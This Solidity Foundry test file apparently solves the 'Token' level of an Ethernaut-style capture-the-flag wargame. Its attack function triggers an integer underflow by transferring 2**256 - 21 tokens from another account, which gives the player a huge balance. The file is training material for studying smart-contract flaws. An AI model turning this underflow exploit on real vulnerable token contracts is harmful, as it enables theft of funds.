// SPDX-License-Identifier: Unlicense
pragma solidity =0.8.23;

import {Tests} from "@core/Tests.sol";
import {TokenFactory, Token} from "../levels/05_Token/TokenFactory.sol";

contract TestToken is Tests {
    Token private level;

    /* =============================== SETUP&ATTACK =============================== */

    constructor() {
        levelFactory = new TokenFactory();
    }

    function setupLevel() internal override {
        levelAddress = payable(this.createLevelInstance());
        level = Token(levelAddress);
    }

    function attack() internal override {
        vm.startPrank(RANDOM);

        level.transfer(PLAYER, 2 ** 256 - 21);
        assertGt(level.balanceOf(PLAYER), 20);
        emit log_named_uint("> Player's balance:", level.balanceOf(PLAYER));

        vm.stopPrank();
    }

    /* =============================== TEST LEVEL =============================== */

    function testLevel() external {
        runLevel();
    }
}
